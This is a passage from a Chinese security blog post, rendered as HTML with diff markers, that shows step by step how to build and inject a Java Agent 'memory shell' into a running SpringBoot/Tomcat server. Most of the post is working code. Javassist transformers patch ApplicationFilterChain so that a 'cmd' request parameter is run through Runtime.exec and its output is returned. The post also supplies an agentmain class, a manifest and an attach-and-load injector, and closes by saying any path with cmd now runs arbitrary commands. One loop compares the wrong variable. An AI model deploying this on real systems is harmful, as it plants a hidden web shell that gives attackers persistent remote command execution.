+                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span>              classfileBuffer<span class="token punctuation">)</span>
+        <span class="token keyword">throws</span> <span class="token class-name">IllegalClassFormatException</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>ClassFileTransformer是一个接口，它只有一个 <code>transform()</code> 方法，该方法返回字节数组，用于在类加载期间对字节码进行转换，可以在类加载过程中修改类的字节码，以实现各种目的，如增加、删除或修改类的方法、字段等</p>
+<h3 id="addTransformer"><a href="#addTransformer" class="headerlink" title="addTransformer"></a>addTransformer</h3><p><code>addTransformer()</code> 方法注册一个转换器，编写 <code>ClassFileTransformer</code> 接口自定义类注册自定义的转换器，在该转换器中加载恶意的代码，当类加载时，就会自动调用自定义的转换器的 <code>transform</code> 方法</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtMethod</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span></span><span class="token class-name">ClassFileTransformer</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span></span><span class="token class-name">IllegalClassFormatException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">ProtectionDomain</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DefineTransform</span> <span class="token keyword">implements</span> <span class="token class-name">ClassFileTransformer</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> applicationFilterChain <span class="token operator">=</span> <span class="token string">"org.apache.catalina.core.ApplicationFilterChain"</span><span class="token punctuation">;</span>
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span> loader<span class="token punctuation">,</span> <span class="token class-name">String</span> className<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> classBeingRedefined<span class="token punctuation">,</span> <span class="token class-name">ProtectionDomain</span> protectionDomain<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classfileBuffer<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IllegalClassFormatException</span> <span class="token punctuation">&#123;</span>
+        className <span class="token operator">=</span> className<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>applicationFilterChain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
+                <span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>applicationFilterChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token class-name">CtMethod</span> internalDoFilter <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"internalDoFilter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                internalDoFilter<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span><span class="token string">"HttpServletRequest req = (HttpServletRequest) servletRequest;String cmd = req.getParameter(\"cmd\");if (cmd != null)&#123;Runtime.getRuntime().exec(cmd);&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytecode <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                ctClass<span class="token punctuation">.</span><span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">return</span> bytecode<span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="getAllLoadedClasses"><a href="#getAllLoadedClasses" class="headerlink" title="getAllLoadedClasses"></a>getAllLoadedClasses</h3><p><code>getAllLoadedClasses</code> 方法可以列出所有已加载的Class</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> allLoadedClasses <span class="token operator">=</span> inst<span class="token punctuation">.</span><span class="token function">getAllLoadedClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Class</span> allLoadedClass <span class="token operator">:</span> allLoadedClasses<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>allLoadedClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="retransformClasses"><a href="#retransformClasses" class="headerlink" title="retransformClasses"></a>retransformClasses</h3><p><code>retransformClasses</code> 方法可以对已加载的Class重新定义，若目标类已经加载，调用该函数可以重新触发转换器的拦截，对目标类重新定义</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> classes <span class="token operator">=</span> inst<span class="token punctuation">.</span><span class="token function">getAllLoadedClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Class</span> cls <span class="token operator">:</span> classes<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"org.apache.catalina.core.ApplicationFilterChain"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        inst<span class="token punctuation">.</span><span class="token function">addTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Hello_Transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        inst<span class="token punctuation">.</span><span class="token function">retransformClasses</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Agent内存马"><a href="#Agent内存马" class="headerlink" title="Agent内存马"></a>Agent内存马</h2><p>这里我们准备的环境是SpringBoot，模拟在SpringBoot环境下，注入Agent内存马</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span></span><span class="token class-name">ClassFileTransformer</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">ProtectionDomain</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DefineTransform</span> <span class="token keyword">implements</span> <span class="token class-name">ClassFileTransformer</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> applicationFilterChain <span class="token operator">=</span> <span class="token string">"org.apache.catalina.core.ApplicationFilterChain"</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span> loader<span class="token punctuation">,</span> <span class="token class-name">String</span> className<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> classBeingRedefined<span class="token punctuation">,</span> <span class="token class-name">ProtectionDomain</span> protectionDomain<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classfileBuffer<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        className <span class="token operator">=</span> className<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>applicationFilterChain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+                <span class="token class-name">CtClass</span> c <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">getCtClass</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token class-name">CtMethod</span> m <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"doFilter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                m<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span><span class="token string">"jakarta.servlet.http.HttpServletRequest req =  request;\n"</span> <span class="token operator">+</span>
+                        <span class="token string">"jakarta.servlet.http.HttpServletResponse res = response;\n"</span> <span class="token operator">+</span>
+                        <span class="token string">"java.lang.String cmd = request.getParameter(\"cmd\");\n"</span> <span class="token operator">+</span>
+                        <span class="token string">"if (cmd != null)&#123;\n"</span> <span class="token operator">+</span>
+                        <span class="token string">"    try &#123;\n"</span> <span class="token operator">+</span>
+                        <span class="token string">"        java.io.InputStream in = java.lang.Runtime.getRuntime().exec(cmd).getInputStream();"</span> <span class="token operator">+</span>
+                        <span class="token string">"\n"</span> <span class="token operator">+</span>
+                        <span class="token string">"        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n"</span> <span class="token operator">+</span>
+                        <span class="token string">"        String line;\n"</span> <span class="token operator">+</span>
+                        <span class="token string">"        StringBuilder sb = new StringBuilder(\"\");\n"</span> <span class="token operator">+</span>
+                        <span class="token string">"        while ((line=reader.readLine()) != null)&#123;\n"</span> <span class="token operator">+</span>
+                        <span class="token string">"            sb.append(line).append(\"\\n\");\n"</span> <span class="token operator">+</span>
+                        <span class="token string">"        &#125;\n"</span> <span class="token operator">+</span>
+                        <span class="token string">"        response.getOutputStream().print(sb.toString());\n"</span> <span class="token operator">+</span>
+                        <span class="token string">"        response.getOutputStream().flush();\n"</span> <span class="token operator">+</span>
+                        <span class="token string">"        response.getOutputStream().close();\n"</span> <span class="token operator">+</span>
+                        <span class="token string">"    &#125; catch (Exception e)&#123;\n"</span> <span class="token operator">+</span>
+                        <span class="token string">"        e.printStackTrace();\n"</span> <span class="token operator">+</span>
+                        <span class="token string">"    &#125;\n"</span> <span class="token operator">+</span>
+                        <span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                c<span class="token punctuation">.</span><span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">return</span> bytes<span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>先写一个转换器，对 <code>ApplicationFilterChain</code> 类的 <code> doFilter</code> 方法进行添加恶意代码</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span></span><span class="token class-name">Instrumentation</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AgentMain</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> applicationFilterChain <span class="token operator">=</span> <span class="token string">"org.apache.catalina.core.ApplicationFilterChain"</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">agentmain</span><span class="token punctuation">(</span><span class="token class-name">String</span> args<span class="token punctuation">,</span> <span class="token class-name">Instrumentation</span> inst<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        inst<span class="token punctuation">.</span><span class="token function">addTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">DefineTransform</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> allLoadedClasses <span class="token operator">=</span> inst<span class="token punctuation">.</span><span class="token function">getAllLoadedClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Class</span> allLoadedClass <span class="token operator">:</span> allLoadedClasses<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>allLoadedClasses<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>applicationFilterChain<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+                    inst<span class="token punctuation">.</span><span class="token function">retransformClasses</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>allLoadedClass<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里，我们就使用 <code>agentmain</code> 方法，用于启动后加载Agent场景，在该方法中主要是寻找我们修改的 <code>ApplicationFilterChain</code> 类，触发我们上面写的转换器 <code>transform</code> 方法</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Manifest</span><span class="token operator">-</span><span class="token class-name">Version</span><span class="token operator">:</span> <span class="token number">1.0</span>
+<span class="token class-name">Can</span><span class="token operator">-</span><span class="token class-name">Redefine</span><span class="token operator">-</span><span class="token class-name">Classes</span><span class="token operator">:</span> <span class="token boolean">true</span>
+<span class="token class-name">Can</span><span class="token operator">-</span><span class="token class-name">Retransform</span><span class="token operator">-</span><span class="token class-name">Classes</span><span class="token operator">:</span> <span class="token boolean">true</span>
+<span class="token class-name">Agent</span><span class="token operator">-</span><span class="token class-name">Class</span><span class="token operator">:</span> <span class="token class-name">AgentMain</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>编写一下 <code>MANIFEST.MF</code> 文件</p>
+<p><img src="/images/Agent%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230920164226906.png" alt="image-20230920164226906"></p>
+<p>将 <code>tools</code> 和 <code>javassist</code> 依赖一并打包</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>attach<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Inject_Agent</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">AttachNotSupportedException</span><span class="token punctuation">,</span> <span class="token class-name">AgentLoadException</span><span class="token punctuation">,</span> <span class="token class-name">AgentInitializationException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">VirtualMachineDescriptor</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token class-name">VirtualMachine</span><span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">VirtualMachineDescriptor</span> virtualMachineDescriptor <span class="token operator">:</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>virtualMachineDescriptor<span class="token punctuation">.</span><span class="token function">displayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"org.studyspringboot.StudyspringbootApplication"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token class-name">VirtualMachine</span> attach <span class="token operator">=</span> <span class="token class-name">VirtualMachine</span><span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>virtualMachineDescriptor<span class="token punctuation">.</span><span class="token function">id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                attach<span class="token punctuation">.</span><span class="token function">loadAgent</span><span class="token punctuation">(</span><span class="token string">"/Users/wiley/Desktop/AgentMain.jar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                attach<span class="token punctuation">.</span><span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>使用 <code>VirtualMachine</code> 来加载Agent，这个类主要是模拟将 <code>AgentMain.jar</code> 和 <code>Inject_Agent</code> 类文件上传到受害者服务端，运行 <code>Inject_Agent</code> 程序寻找SpringBoot的程序连接到该程序的JVM，进行加载恶意Agent</p>
+<p><img src="/images/Agent%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230920170721999.png" alt="image-20230920170721999"></p>
+<p><img src="/images/Agent%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230920170751288.png" alt="image-20230920170751288"></p>
+<p>模拟环境中，启动SpringBoot为真实的受害者服务端，运行 <code>Inject_Agent</code> 程序来进行注入Agent，没有出现报错说明成功注入了</p>
+<p><img src="/images/Agent%E5%86%85%E5%AD%98%E9%A9%AC_img/image-20230920171847143.png" alt="image-20230920171847143"></p>
+<p>访问任意路径，加上cmd参数即可执行任意命令</p>
+
+    </div>
+    
+    <div class="post__license">
+        <p>
+            <strong>Author: </strong>wileysec
+        </p>
+        <p>
+            <strong>
+                Permalink: 
+            </strong>
+            <a href="https://wileysec.github.io/c92b2696b98a.html">https://wileysec.github.io/c92b2696b98a.html</a>
+        </p>
+        
+    </div>
+ 
+    <div class="post-footer__meta"><p>文章更新于 2023-09-20</p></div> 
+    <div class="post-entry__tags"><a href="/tags/Java%E5%AE%89%E5%85%A8/" class="post-tags__link button"># Java安全</a><a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" class="post-tags__link button"># 内存马</a><a href="/tags/Agent%E5%86%85%E5%AD%98%E9%A9%AC/" class="post-tags__link button"># Agent内存马</a></div> 
+</article>
+
+
+    <div class="nav">
+        <div class="nav__prev">
+            
+        </div>
+        <div class="nav__next">
+            
+                <a href="/6802f3c82607.html" class="nav__link">
+                    <div>
+                        <div class="nav__label">
+                            Next Post
+                        </div>
+                        <div class="nav__title">
+                            Java内存马-Spring内存马分析与实现
+                        </div>
+                    </div>
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M434.944 790.624l-45.248-45.248L623.04 512l-233.376-233.376 45.248-45.248L713.568 512z" fill="#808080"></path></svg>
+                    </div>
+                </a>
+            
+        </div>
+    </div>
+
+
+
+    <div class="post__comments post__with-toc content-card" id="comment">
+        
+    <h4>Comments</h4>
+    
+    
+    
+    <div id="valine_container" class="valine_thread"></div>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+    </div>
+
+
+
+</main>
+
+            <footer class="footer">
+     
+    <a href="#" class="button" id="b2t" aria-label="Back to Top" title="Back to Top">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="32" height="32">
+            <path d="M233.376 722.752L278.624 768 512 534.624 745.376 768l45.248-45.248L512 444.128zM192 352h640V288H192z" fill="currentColor"></path>
+        </svg>
+    </a>
+
+    
+
+
+    
+     
+ 
+
+ 
+    
+        
+        <p class="footer-copyright">
+            Copyright © 2023 <a href="/">Wileysec&#39;s Blog</a>
+        </p>
+    
+    
+    <p><a href="https://beian.miit.gov.cn/" target="_blank">皖ICP备18006273号-1</a></p>
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme - <a href="https://github.com/ChrAlpha/hexo-theme-cards" target="_blank">Cards</a></p>
+    <p></p>
+</footer>
+
+        </div>
+         
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+
+ 
+
+
+
+ 
+
+
+    
+ 
+
+
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.css">
+
+    
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.js"></script>
+
+    <script>
+        let lazyloadT = Boolean('false'),
+            auto_fancybox = Boolean('false')
+        if (auto_fancybox) {
+            $(".post__content").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        } else {
+            $(".post__content").find("fancybox").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        }
+    </script>
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+    
+
+    
+
+    
+    
+    <script>
+        function loadComment() {
+            let e;
+            (e = document.createElement("script")).src = 'https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js',
+            document.body.appendChild(e);
+            e.onload = () => {
+                var valineConfig = {"appId":"GwvNoIVYwbmwRKo2fr9bcJHp-gzGzoHsz","appKey":"9olsAGq7SGWYUVcmI5RDrXid","placeholder":"请佬们指正","path":null,"avatar":"wavatar","meta":["nick","mail","link"],"pageSize":10,"lang":["zh-CN","en","zh-TW"],"visitor":null,"highlight":null,"avatarForce":null,"recordIP":true,"serverURLs":null,"enableQQ":null,"requiredFields":["nick","mail"],"emojiCDN":null,"emojiMaps":null};
+                valineConfig.el = '#valine_container';
+                for (var i in valineConfig) {
+                    if (valineConfig[i] === null) delete valineConfig[i];
+                }
+                new Valine(valineConfig);
+            };
+        }
+    
+        var runningOnBrowser = typeof window !== "undefined";
+        var isBot = runningOnBrowser && !("onscroll" in window) || typeof navigator !== "undefined" && /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);
+        var supportsIntersectionObserver = runningOnBrowser && "IntersectionObserver" in window;
+    
+        setTimeout(function () {
+            if (!isBot && supportsIntersectionObserver) {
+                var comment_observer = new IntersectionObserver(function(entries) {
+                    if (entries[0].isIntersecting) {
+                        loadComment();
+                        comment_observer.disconnect();
+                    }
+                }, { threshold: [0] });
